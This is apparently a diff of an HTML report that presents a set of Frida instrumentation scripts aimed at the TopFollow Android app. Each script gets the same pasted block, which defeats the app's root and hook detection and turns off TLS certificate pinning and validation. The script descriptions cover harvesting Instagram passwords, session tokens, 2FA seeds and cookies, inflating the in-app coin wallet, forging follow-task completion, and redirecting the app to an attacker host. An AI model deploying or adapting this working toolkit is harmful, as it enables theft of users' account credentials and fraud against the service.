+  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
+})();
+
 const H = (typeof module !== 'undefined' &amp;&amp; module.exports) ? module.exports : H;
 
 function hex(bytes) { let s = ''; for (let i = 0; i &lt; bytes.length; i++) s += ('0' + (bytes[i] &amp; 0xff).toString(16)).slice(-2); return s; }
@@ -3049,11 +3274,13 @@ Java.perform(function () {
 });
 
 H.hr('SSL pinning bypass ARMED');
+
+globalThis.__TF_BYPASS_ARMED = true;  // full baseline loaded: downstream scripts skip self-arm
 </code></pre></details>
 </section>
 
 <section class="card" id="script-03_instagram_api_intercept">
-  <h3><span class="mono">03_instagram_api_intercept.js</span> <span class="muted">&mdash; 196 lines</span></h3>
+  <h3><span class="mono">03_instagram_api_intercept.js</span> <span class="muted">&mdash; 302 lines</span></h3>
   <p>Full request/response logging of all three Instagram Retrofits, the ia.q.f() header factory, d.p()/d.q() crypto and every native signed_body.</p>
   <details><summary>Show source</summary><pre class="code"><code>/* ============================================================================
  * 03 - INSTAGRAM PRIVATE-API / GRAPHQL / WEB TRAFFIC INTERCEPTOR
@@ -3085,6 +3312,112 @@ H.hr('SSL pinning bypass ARMED');
  *                                        -l 02_ssl_pinning_bypass.js -l 03_instagram_api_intercept.js
  * ==========================================================================*/
 'use strict';
+
+/* ===========================================================================
+ * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
+ * ---------------------------------------------------------------------------
+ * TopFollow detects hooks at startup unless the anti-tamper killer is active:
+ *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
+ *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
+ *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
+ *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
+ * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
+ * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
+ * installs the minimal bypass set so THIS script alone still works on device.
+ * =========================================================================*/
+(function selfArmBypass() {
+  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
+  globalThis.__TF_SELF_ARMED = true;
+  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
+              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
+  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
+              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
+              '/data/local/su','superuser.apk'];
+  function sus(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
+    for (var i = 0; i &lt; ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
+    return false;
+  }
+  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
+    var p = Module.findExportByName(null, fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
+        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
+      });
+    } catch (e) {}
+  });
+  function scrub(buf, n) {
+    if (n &lt;= 0) return n;
+    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
+    if (!s) return n;
+    var hit = false, low = s.toLowerCase();
+    for (var i = 0; i &lt; DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
+    if (!hit) return n;
+    var clean = s.split('\n').filter(function (l) {
+      var ll = l.toLowerCase();
+      for (var j = 0; j &lt; DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
+      return true;
+    }).join('\n');
+    var cb = Memory.allocUtf8String(clean);
+    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
+    return clean.length;
+  }
+  var rp = Module.findExportByName('libc.so', 'read');
+  if (rp) Interceptor.attach(rp, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  var rc = Module.findExportByName('libc.so', '__read_chk');
+  if (rc) Interceptor.attach(rc, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  ['strstr','strcmp','strncmp'].forEach(function (fn) {
+    var p = Module.findExportByName('libc.so', fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) {
+          this.hit = false;
+          try {
+            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
+            var l = (s1 + '|' + s2).toLowerCase();
+            for (var i = 0; i &lt; DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
+          } catch (e) {}
+        },
+        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
+      });
+    } catch (e) {}
+  });
+  Java.perform(function () {
+    try {
+      var CP = Java.use('okhttp3.CertificatePinner');
+      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
+      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
+    } catch (e) {}
+    try {
+      var SSLContext = Java.use('javax.net.ssl.SSLContext');
+      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+      var EmptyTM = Java.registerClass({
+        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
+        implements: [TrustManager],
+        methods: {
+          checkClientTrusted: function () {},
+          checkServerTrusted: function () {},
+          getAcceptedIssuers: function () { return []; }
+        }
+      }).$new();
+      var ctx = SSLContext.getInstance('TLS');
+      ctx.init(null, [EmptyTM], null);
+    } catch (e) {}
+  });
+  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
+})();
+
 const H = (typeof module !== 'undefined' &amp;&amp; module.exports) ? module.exports : H;
 
 function s(j) { try { return j === null || j === undefined ? String(j) : j.toString(); } catch (e) { return '&lt;' + e + '&gt;'; } }
@@ -3254,7 +3587,7 @@ H.hr('Instagram API interceptor ARMED');
 </section>
 
 <section class="card" id="script-04_credential_theft">
-  <h3><span class="mono">04_credential_theft.js</span> <span class="muted">&mdash; 212 lines</span></h3>
+  <h3><span class="mono">04_credential_theft.js</span> <span class="muted">&mdash; 318 lines</span></h3>
   <p>Harvests Instagram passwords, bearer tokens, 2FA seeds, the WebView cookie jar and all ciphered SharedPreferences, and writes a JSON dump.</p>
   <details><summary>Show source</summary><pre class="code"><code>/* ============================================================================
  * 04 - CREDENTIAL HARVESTER  (Instagram passwords, 2FA seeds, session tokens)
@@ -3298,6 +3631,112 @@ H.hr('Instagram API interceptor ARMED');
  *        then run:  rpc.exports.dump()   (or just wait - it auto-dumps on login)
  * ==========================================================================*/
 'use strict';
+
+/* ===========================================================================
+ * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
+ * ---------------------------------------------------------------------------
+ * TopFollow detects hooks at startup unless the anti-tamper killer is active:
+ *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
+ *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
+ *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
+ *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
+ * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
+ * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
+ * installs the minimal bypass set so THIS script alone still works on device.
+ * =========================================================================*/
+(function selfArmBypass() {
+  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
+  globalThis.__TF_SELF_ARMED = true;
+  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
+              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
+  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
+              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
+              '/data/local/su','superuser.apk'];
+  function sus(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
+    for (var i = 0; i &lt; ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
+    return false;
+  }
+  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
+    var p = Module.findExportByName(null, fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
+        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
+      });
+    } catch (e) {}
+  });
+  function scrub(buf, n) {
+    if (n &lt;= 0) return n;
+    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
+    if (!s) return n;
+    var hit = false, low = s.toLowerCase();
+    for (var i = 0; i &lt; DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
+    if (!hit) return n;
+    var clean = s.split('\n').filter(function (l) {
+      var ll = l.toLowerCase();
+      for (var j = 0; j &lt; DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
+      return true;
+    }).join('\n');
+    var cb = Memory.allocUtf8String(clean);
+    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
+    return clean.length;
+  }
+  var rp = Module.findExportByName('libc.so', 'read');
+  if (rp) Interceptor.attach(rp, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  var rc = Module.findExportByName('libc.so', '__read_chk');
+  if (rc) Interceptor.attach(rc, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  ['strstr','strcmp','strncmp'].forEach(function (fn) {
+    var p = Module.findExportByName('libc.so', fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) {
+          this.hit = false;
+          try {
+            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
+            var l = (s1 + '|' + s2).toLowerCase();
+            for (var i = 0; i &lt; DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
+          } catch (e) {}
+        },
+        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
+      });
+    } catch (e) {}
+  });
+  Java.perform(function () {
+    try {
+      var CP = Java.use('okhttp3.CertificatePinner');
+      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
+      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
+    } catch (e) {}
+    try {
+      var SSLContext = Java.use('javax.net.ssl.SSLContext');
+      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+      var EmptyTM = Java.registerClass({
+        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
+        implements: [TrustManager],
+        methods: {
+          checkClientTrusted: function () {},
+          checkServerTrusted: function () {},
+          getAcceptedIssuers: function () { return []; }
+        }
+      }).$new();
+      var ctx = SSLContext.getInstance('TLS');
+      ctx.init(null, [EmptyTM], null);
+    } catch (e) {}
+  });
+  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
+})();
+
 const H = (typeof module !== 'undefined' &amp;&amp; module.exports) ? module.exports : H;
 
 function dec(D, v) { if (v === null || v === undefined) return null; const t = String(v); if (!t || t === 'null') return t; try { return D.p(t); } catch (e) { return '&lt;undecryptable:' + t.slice(0, 40) + '&gt;'; } }
@@ -3471,7 +3910,7 @@ H.hr('credential harvester ARMED (auto-dumps on login; rpc.exports.dump() anytim
 </section>
 
 <section class="card" id="script-05_coin_economy_bypass">
-  <h3><span class="mono">05_coin_economy_bypass.js</span> <span class="muted">&mdash; 173 lines</span></h3>
+  <h3><span class="mono">05_coin_economy_bypass.js</span> <span class="muted">&mdash; 279 lines</span></h3>
   <p>Inflates the local coin/gem wallet, forces every affordability check, rewrites order_count/type at submit time and logs all 26 backend endpoints.</p>
   <details><summary>Show source</summary><pre class="code"><code>/* ============================================================================
  * 05 - COIN / GEM ECONOMY + FOLLOWER-PURCHASE TAMPERING
@@ -3525,6 +3964,112 @@ H.hr('credential harvester ARMED (auto-dumps on login; rpc.exports.dump() anytim
  *                                        -l 02_ssl_pinning_bypass.js -l 05_coin_economy_bypass.js
  * ==========================================================================*/
 'use strict';
+
+/* ===========================================================================
+ * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
+ * ---------------------------------------------------------------------------
+ * TopFollow detects hooks at startup unless the anti-tamper killer is active:
+ *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
+ *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
+ *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
+ *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
+ * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
+ * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
+ * installs the minimal bypass set so THIS script alone still works on device.
+ * =========================================================================*/
+(function selfArmBypass() {
+  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
+  globalThis.__TF_SELF_ARMED = true;
+  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
+              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
+  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
+              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
+              '/data/local/su','superuser.apk'];
+  function sus(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
+    for (var i = 0; i &lt; ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
+    return false;
+  }
+  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
+    var p = Module.findExportByName(null, fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
+        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
+      });
+    } catch (e) {}
+  });
+  function scrub(buf, n) {
+    if (n &lt;= 0) return n;
+    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
+    if (!s) return n;
+    var hit = false, low = s.toLowerCase();
+    for (var i = 0; i &lt; DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
+    if (!hit) return n;
+    var clean = s.split('\n').filter(function (l) {
+      var ll = l.toLowerCase();
+      for (var j = 0; j &lt; DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
+      return true;
+    }).join('\n');
+    var cb = Memory.allocUtf8String(clean);
+    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
+    return clean.length;
+  }
+  var rp = Module.findExportByName('libc.so', 'read');
+  if (rp) Interceptor.attach(rp, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  var rc = Module.findExportByName('libc.so', '__read_chk');
+  if (rc) Interceptor.attach(rc, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  ['strstr','strcmp','strncmp'].forEach(function (fn) {
+    var p = Module.findExportByName('libc.so', fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) {
+          this.hit = false;
+          try {
+            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
+            var l = (s1 + '|' + s2).toLowerCase();
+            for (var i = 0; i &lt; DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
+          } catch (e) {}
+        },
+        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
+      });
+    } catch (e) {}
+  });
+  Java.perform(function () {
+    try {
+      var CP = Java.use('okhttp3.CertificatePinner');
+      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
+      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
+    } catch (e) {}
+    try {
+      var SSLContext = Java.use('javax.net.ssl.SSLContext');
+      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+      var EmptyTM = Java.registerClass({
+        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
+        implements: [TrustManager],
+        methods: {
+          checkClientTrusted: function () {},
+          checkServerTrusted: function () {},
+          getAcceptedIssuers: function () { return []; }
+        }
+      }).$new();
+      var ctx = SSLContext.getInstance('TLS');
+      ctx.init(null, [EmptyTM], null);
+    } catch (e) {}
+  });
+  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
+})();
+
 const H = (typeof module !== 'undefined' &amp;&amp; module.exports) ? module.exports : H;
 
 const FAKE_COIN = 999999999;
@@ -3649,7 +4194,7 @@ H.hr('coin-economy bypass ARMED  (wallet=' + FAKE_COIN + ', rpc.exports.setorder
 </section>
 
 <section class="card" id="script-06_task_verification_bypass">
-  <h3><span class="mono">06_task_verification_bypass.js</span> <span class="muted">&mdash; 172 lines</span></h3>
+  <h3><span class="mono">06_task_verification_bypass.js</span> <span class="muted">&mdash; 278 lines</span></h3>
   <p>Forges InstagramResponse.getStatus()=='ok', forces get_coin='true', rewrites order_value and dumps the entire order/syncOrder.php claim.</p>
   <details><summary>Show source</summary><pre class="code"><code>/* ============================================================================
  * 06 - FOLLOW-TASK VERIFICATION BYPASS  (fake task completion -&gt; free coins)
@@ -3701,6 +4246,112 @@ H.hr('coin-economy bypass ARMED  (wallet=' + FAKE_COIN + ', rpc.exports.setorder
  *                                        -l 02_ssl_pinning_bypass.js -l 06_task_verification_bypass.js
  * ==========================================================================*/
 'use strict';
+
+/* ===========================================================================
+ * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
+ * ---------------------------------------------------------------------------
+ * TopFollow detects hooks at startup unless the anti-tamper killer is active:
+ *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
+ *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
+ *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
+ *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
+ * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
+ * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
+ * installs the minimal bypass set so THIS script alone still works on device.
+ * =========================================================================*/
+(function selfArmBypass() {
+  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
+  globalThis.__TF_SELF_ARMED = true;
+  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
+              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
+  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
+              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
+              '/data/local/su','superuser.apk'];
+  function sus(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
+    for (var i = 0; i &lt; ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
+    return false;
+  }
+  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
+    var p = Module.findExportByName(null, fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
+        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
+      });
+    } catch (e) {}
+  });
+  function scrub(buf, n) {
+    if (n &lt;= 0) return n;
+    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
+    if (!s) return n;
+    var hit = false, low = s.toLowerCase();
+    for (var i = 0; i &lt; DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
+    if (!hit) return n;
+    var clean = s.split('\n').filter(function (l) {
+      var ll = l.toLowerCase();
+      for (var j = 0; j &lt; DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
+      return true;
+    }).join('\n');
+    var cb = Memory.allocUtf8String(clean);
+    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
+    return clean.length;
+  }
+  var rp = Module.findExportByName('libc.so', 'read');
+  if (rp) Interceptor.attach(rp, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  var rc = Module.findExportByName('libc.so', '__read_chk');
+  if (rc) Interceptor.attach(rc, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  ['strstr','strcmp','strncmp'].forEach(function (fn) {
+    var p = Module.findExportByName('libc.so', fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) {
+          this.hit = false;
+          try {
+            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
+            var l = (s1 + '|' + s2).toLowerCase();
+            for (var i = 0; i &lt; DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
+          } catch (e) {}
+        },
+        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
+      });
+    } catch (e) {}
+  });
+  Java.perform(function () {
+    try {
+      var CP = Java.use('okhttp3.CertificatePinner');
+      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
+      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
+    } catch (e) {}
+    try {
+      var SSLContext = Java.use('javax.net.ssl.SSLContext');
+      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+      var EmptyTM = Java.registerClass({
+        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
+        implements: [TrustManager],
+        methods: {
+          checkClientTrusted: function () {},
+          checkServerTrusted: function () {},
+          getAcceptedIssuers: function () { return []; }
+        }
+      }).$new();
+      var ctx = SSLContext.getInstance('TLS');
+      ctx.init(null, [EmptyTM], null);
+    } catch (e) {}
+  });
+  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
+})();
+
 const H = (typeof module !== 'undefined' &amp;&amp; module.exports) ? module.exports : H;
 
 const FAKE_OK       = true;    // force every IG task response to look successful
@@ -3826,7 +4477,7 @@ H.hr('task-verification bypass ARMED (get_coin forced "true")');
 </section>
 
 <section class="card" id="script-07_native_jni_dumper">
-  <h3><span class="mono">07_native_jni_dumper.js</span> <span class="muted">&mdash; 227 lines</span></h3>
+  <h3><span class="mono">07_native_jni_dumper.js</span> <span class="muted">&mdash; 333 lines</span></h3>
   <p>Intercepts RegisterNatives to resolve all 22 helper.q JNI functions, instruments each, and re-derives the XOR 0x55/0x5A and triple-base64 string tables from memory.</p>
   <details><summary>Show source</summary><pre class="code"><code>/* ============================================================================
  * 07 - libtopfollow.so NATIVE / JNI INSTRUMENTATION &amp; DUMPER
@@ -3877,6 +4528,112 @@ H.hr('task-verification bypass ARMED (get_coin forced "true")');
  * Usage: frida -U -f com.nivaroid.topfollow -l 00_common.js -l 07_native_jni_dumper.js
  * ==========================================================================*/
 'use strict';
+
+/* ===========================================================================
+ * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
+ * ---------------------------------------------------------------------------
+ * TopFollow detects hooks at startup unless the anti-tamper killer is active:
+ *   - maps scanner reads /proc/self/maps via __open_2 + read()/__read_chk and
+ *     string-matches XOR-0x5A/base64 tokens (frida/xposed/riru/zygisk/substrate)
+ *   - 9 su-path probes via access()/open (func#169 @0x13ba30)
+ *   - OkHttp CertificatePinner (pin d845591e...6bec5e == signing-cert digest)
+ * If 01_anti_tamper_killer.js / 02_ssl_pinning_bypass.js were loaded first they
+ * set globalThis.__TF_BYPASS_ARMED and this block is a no-op; otherwise it
+ * installs the minimal bypass set so THIS script alone still works on device.
+ * =========================================================================*/
+(function selfArmBypass() {
+  if (globalThis.__TF_BYPASS_ARMED || globalThis.__TF_SELF_ARMED) return;
+  globalThis.__TF_SELF_ARMED = true;
+  var DENY = ['frida','gum-js','gadget','re.frida','xposed','lsposed','edxposed',
+              'riru','zygisk','substrate','libbridge','(deleted)','rwxp','magisk'];
+  var ROOT = ['/sbin/su','/system/bin/su','/system/xbin/su','/data/local/xbin/su',
+              '/data/local/bin/su','/system/sd/xbin/su','/system/bin/failsafe/su',
+              '/data/local/su','superuser.apk'];
+  function sus(p) {
+    if (!p) return false;
+    var l = p.toLowerCase();
+    if (l.indexOf('/proc/self/maps') !== -1) return 'maps';
+    for (var i = 0; i &lt; ROOT.length; i++) if (l.indexOf(ROOT[i]) !== -1) return 'root';
+    return false;
+  }
+  ['open','open64','fopen','__open_2','openat','access','stat','lstat'].forEach(function (fn) {
+    var p = Module.findExportByName(null, fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) { try { this.p = a[0].readCString(); } catch (e) { this.p = null; } this.d = sus(this.p); },
+        onLeave: function (r) { if (this.d === 'root') r.replace(ptr(-1)); }
+      });
+    } catch (e) {}
+  });
+  function scrub(buf, n) {
+    if (n &lt;= 0) return n;
+    var s; try { s = buf.readUtf8String(n); } catch (e) { return n; }
+    if (!s) return n;
+    var hit = false, low = s.toLowerCase();
+    for (var i = 0; i &lt; DENY.length; i++) if (low.indexOf(DENY[i]) !== -1) { hit = true; break; }
+    if (!hit) return n;
+    var clean = s.split('\n').filter(function (l) {
+      var ll = l.toLowerCase();
+      for (var j = 0; j &lt; DENY.length; j++) if (ll.indexOf(DENY[j]) !== -1) return false;
+      return true;
+    }).join('\n');
+    var cb = Memory.allocUtf8String(clean);
+    Memory.copy(buf, cb, Math.min(n, clean.length + 1));
+    return clean.length;
+  }
+  var rp = Module.findExportByName('libc.so', 'read');
+  if (rp) Interceptor.attach(rp, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  var rc = Module.findExportByName('libc.so', '__read_chk');
+  if (rc) Interceptor.attach(rc, {
+    onEnter: function (a) { this.b = a[1]; },
+    onLeave: function (r) { var n = r.toInt32(); if (n &gt; 0) { var m = scrub(this.b, n); if (m !== n) r.replace(m); } }
+  });
+  ['strstr','strcmp','strncmp'].forEach(function (fn) {
+    var p = Module.findExportByName('libc.so', fn);
+    if (!p) return;
+    try {
+      Interceptor.attach(p, {
+        onEnter: function (a) {
+          this.hit = false;
+          try {
+            var s1 = a[0].readCString() || '', s2 = a[1].readCString() || '';
+            var l = (s1 + '|' + s2).toLowerCase();
+            for (var i = 0; i &lt; DENY.length; i++) if (l.indexOf(DENY[i]) !== -1) { this.hit = true; break; }
+          } catch (e) {}
+        },
+        onLeave: function (r) { if (this.hit) r.replace(ptr(0)); }
+      });
+    } catch (e) {}
+  });
+  Java.perform(function () {
+    try {
+      var CP = Java.use('okhttp3.CertificatePinner');
+      CP.check.overload('java.lang.String', 'java.util.List').implementation = function () {};
+      try { CP.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function () {}; } catch (e) {}
+    } catch (e) {}
+    try {
+      var SSLContext = Java.use('javax.net.ssl.SSLContext');
+      var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+      var EmptyTM = Java.registerClass({
+        name: 'com.tf.lab.EmptyTrustManager' + Date.now(),
+        implements: [TrustManager],
+        methods: {
+          checkClientTrusted: function () {},
+          checkServerTrusted: function () {},
+          getAcceptedIssuers: function () { return []; }
+        }
+      }).$new();
+      var ctx = SSLContext.getInstance('TLS');
+      ctx.init(null, [EmptyTM], null);
+    } catch (e) {}
+  });
+  console.log('[bypass] self-arming minimal anti-tamper/SSL bypass installed (load 01+02 for the full set)');
+})();
+
 const H = (typeof module !== 'undefined' &amp;&amp; module.exports) ? module.exports : H;
 const SONAME = 'libtopfollow.so';
 
@@ -4058,7 +4815,7 @@ H.hr('native/JNI dumper ARMED');
 </section>
 
 <section class="card" id="script-08_backend_traffic_and_servercheck">
-  <h3><span class="mono">08_backend_traffic_and_servercheck.js</span> <span class="muted">&mdash; 215 lines</span></h3>
+  <h3><span class="mono">08_backend_traffic_and_servercheck.js</span> <span class="muted">&mdash; 321 lines</span></h3>
   <p>Logs every backend POST with headers and body, traces ServerCheck pin/URL rotation live, and can redirect the whole app to an attacker host.</p>
   <details><summary>Show source</summary><pre class="code"><code>/* ============================================================================
  * 08 - TOPFOLLOW BACKEND TRAFFIC + ServerCheck / PIN-ROTATION HIJACK
@@ -4112,6 +4869,112 @@ H.hr('native/JNI dumper ARMED');
  *                                        -l 02_ssl_pinning_bypass.js -l 08_backend_traffic_and_servercheck.js
  * ==========================================================================*/
 'use strict';
+
+/* ===========================================================================
+ * SELF-ARMING DETECTION BYPASS (mandatory baseline - built into every script)
+ * ---------------------------------------------------------------------------
+ * TopFollow detects hooks at startup unless the anti-tamper killer is active:
